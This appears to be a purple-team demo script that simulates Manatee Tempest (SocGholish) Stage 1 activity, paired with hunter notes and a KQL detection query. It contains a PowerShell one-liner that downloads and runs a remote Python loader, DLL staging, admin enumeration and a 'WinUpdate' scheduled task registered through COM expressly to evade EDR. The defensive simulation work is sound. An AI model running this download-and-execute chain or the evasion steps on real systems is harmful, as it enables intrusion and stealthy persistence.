# Manatee Tempest Simulation V5: Demo Script

## 1. The Narrative (Introduction)

**The Actor:** Manatee Tempest (SocGholish / Raspberry Robin).

**The Scenario:** A user has been tricked into executing a small command. We are now observing a refined "Stage 1" transition where the attacker stages a payload, enumerates the local environment, and establishes a self-sustaining foothold — all while avoiding the detection signatures that burned V1, V2, V3, and V4.

**Key Difference from V2:** Like V2, this version uses a Scheduled Task for persistence. However, instead of spawning the noisy `schtasks.exe` binary, we create the task directly through the Windows Task Scheduler COM API. This eliminates the telltale child process that behavioral detection systems flag.

---

## 2. Execution Steps & Talking Points

### Step A: The Ingress (Living off the Land)

**Action:** Run the PowerShell command (Stage 0).

```powershell
powershell.exe -Command "curl.exe -L https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip -o C:\ProgramData\python.zip; curl.exe -L https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/refs/heads/main/V5/stage1.py -o C:\ProgramData\hklib.py; Expand-Archive -LiteralPath C:\ProgramData\python.zip -DestinationPath C:\ProgramData\py3 -Force; del C:\ProgramData\python.zip; & C:\ProgramData\py3\python.exe C:\ProgramData\hklib.py"
```

**Narrative:** "We start with a single line of PowerShell. We use curl.exe to pull a legitimate Python environment and our loader from GitHub. This bypasses many basic file-reputation filters because the traffic goes to a trusted domain."

**Hunter Note:** Watch for `powershell.exe` or `cmd.exe` spawning `curl.exe` followed by a large file download to `C:\ProgramData`.

---

### Step B: Payload Staging (DLL Download — No Execution)

**Action:** Python script downloads the DLL to disk.

**Narrative:** "Our loader fetches the payload: `TEST_Dll1.dll`. Unlike V1, the DLL is never executed. It is staged on disk for a hypothetical Stage 2 handoff — the attacker parks the weapon system for a future operator. If the DLL already exists from a previous run, this phase is skipped entirely."

**Visual Check:** Show the DLL appearing in `C:\ProgramData\`.

**Idempotency:** On re-runs, the log shows `[SKIP] DLL already staged`.

---

### Step C: Environment Discovery (Local Admin Enumeration)

**Action:** The script runs `net localgroup Administrators`.

**Narrative:** "Before establishing persistence, the script enumerates the local Administrators group. This is a classic discovery technique (MITRE T1069.001). The attacker needs to know who has elevated access on this machine. This runs on every execution — not just the first — because group membership can change."

**Technical Check:** Review `C:\ProgramData\stage1.log` for the enumerated admin list.

---

### Step D: Self-Persistence (COM-based Scheduled Task)

**Action:** Task creation via Windows Task Scheduler COM interface.

**Narrative:** "To ensure we don't lose access, we create a Scheduled Task named `WinUpdate`. The critical difference from V2: we use the Windows COM API directly from Python instead of shelling out to `schtasks.exe`. This means no suspicious child process is spawned during task creation. From a process tree perspective, only `python.exe` is running — the task registration happens through legitimate COM interfaces. The task fires on user logon. If the task already exists from a previous run, creation is skipped."

**MITRE Technique:** T1053.005 — Scheduled Task/Job: Scheduled Task

**Evasion Gain:** V2 spawned `schtasks.exe` as a child of `python.exe` — a behavioral signal that EDR watches for. V5 uses COM, so there's no `schtasks.exe` in the process tree.

**Prerequisites:** Requires `pywin32` library. The embedded Python doesn't ship with it by default. In a real attack, the adversary would either:
- Download a pre-built wheel and install it
- Use a different Python distribution
- Fall back to V4's .bat approach

**Technical Check:** Run `schtasks /query /tn "WinUpdate" /v`.

**Idempotency:** On re-runs, the log shows `[SKIP] Task 'WinUpdate' already exists`.

**Cleanup:** `schtasks /delete /tn "WinUpdate" /f`

---

### Step E: Validation (The Log)

**Action:** Review the log file.

**Narrative:** "Let's check our operational log. On first run, we see three `[OK]` entries. On subsequent runs triggered by the task (after logon), we see `[SKIP]` for the DLL and task, but a fresh admin enumeration — proving the persistence heartbeat is alive."

**First Run Log:**
```
[OK] DLL staged to C:\ProgramData\TEST_Dll1.dll
=== Local Admin Group ===
...
=========================
[OK] Self-persistence established via COM Task 'WinUpdate' (no schtasks.exe spawned).
```

**Re-run Log:**
```
[SKIP] DLL already staged at C:\ProgramData\TEST_Dll1.dll
=== Local Admin Group ===
...
=========================
[SKIP] Task 'WinUpdate' already exists.
```

---

## 3. KQL Threat Hunt Query

```kql
// ══════════════════════════════════════════════════════════════════
// Threat Hunt: Suspicious Execution Chain Detection (V5 — COM Task)
// Approach: Behavioral detection — no prior knowledge of payloads
// ══════════════════════════════════════════════════════════════════
let Python_NonStandard = 
    DeviceProcessEvents
    | where FileName =~ "python.exe" or FileName =~ "python3.exe"
    | where not(FolderPath has_any (
        "Program Files", 
        "Program Files (x86)", 
        "AppData\\Local\\Programs\\Python",
        "AppData\\Local\\Microsoft\\WindowsApps",
        "Users\\",
        "Windows\\py.exe"
    ))
    | extend Tactic_Detected = "Python Non-Standard Location"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected, 
              FolderPath, ProcessCommandLine, 
              InitiatingProcessFileName, InitiatingProcessParentFileName;
let Enumeration =
    DeviceProcessEvents
    | where FileName == "net.exe" or FileName == "net1.exe"
    | where ProcessCommandLine has "localgroup" 
        and ProcessCommandLine has "Administrators"
    | extend Tactic_Detected = "Enumeration"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected,
              FolderPath, ProcessCommandLine, 
              InitiatingProcessFileName, InitiatingProcessParentFileName;
let Persistence =
    DeviceRegistryEvents
    | where RegistryKey has @"\Schedule\TaskCache\Tree\"
    | where ActionType == "RegistryKeyCreated" or ActionType == "RegistryValueSet"
    | extend Tactic_Detected = "Persistence"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected,
              RegistryKey, RegistryValueName, 
              InitiatingProcessFileName, InitiatingProcessParentFileName;
// ── Combine and summarize ──
union Python_NonStandard, Enumeration, Persistence
| summarize 
    Tactics = make_set(Tactic_Detected),
    Tactic_Count = dcount(Tactic_Detected),
    Parent_Processes = make_set(InitiatingProcessFileName),
    GrandParent_Processes = make_set(InitiatingProcessParentFileName),
    Commands = make_set(ProcessCommandLine),
    Paths = make_set(FolderPath),
    First_Seen = min(Timestamp),
    Last_Seen = max(Timestamp),
    Event_Count = count()
    by DeviceName, AccountName
| extend Risk = case(Tactic_Count == 3, "HIGH", Tactic_Count == 2, "MEDIUM", "LOW")
| sort by Tactic_Count desc
```

**Key Difference:** The Persistence leg now hunts for registry writes to `\Schedule\TaskCache\Tree\` instead of looking for `schtasks.exe` process creation. When tasks are registered via COM, they still write to the Task Scheduler's registry hive — that's the telemetry anchor.

---

## 4. Summary for Security Analysts

**Detection Strategy:** Hunt for the combination of discovery commands (`net.exe` from `python.exe`) and task registration (registry writes to Task Scheduler cache from `python.exe`). The absence of `schtasks.exe` as a child process makes this stealthier than V2, but the registry telemetry still exposes it.

**V1 → V2 → V5 Comparison:**
| Signal | V1 | V2 | V5 |
|--------|----|----|-----|
| Persistence method | Scheduled Task | Scheduled Task | Scheduled Task |
| MITRE Technique | T1053.005 | T1053.005 | T1053.005 |
| Task target | `rundll32.exe ... .dll` | `python.exe ... .py` | `python.exe ... .py` |
| Child process for persistence | `schtasks.exe` | `schtasks.exe` | **None (COM API)** |
| Trigger | Every minute | Every 5 minutes | Every user logon |
| Detection surface | Process creation | Process creation | **Registry write** |
| Prerequisites | None | None | Requires `pywin32` |

**Impact:** This access is what Manatee Tempest sells to ransomware operators to facilitate the final encryption stage.
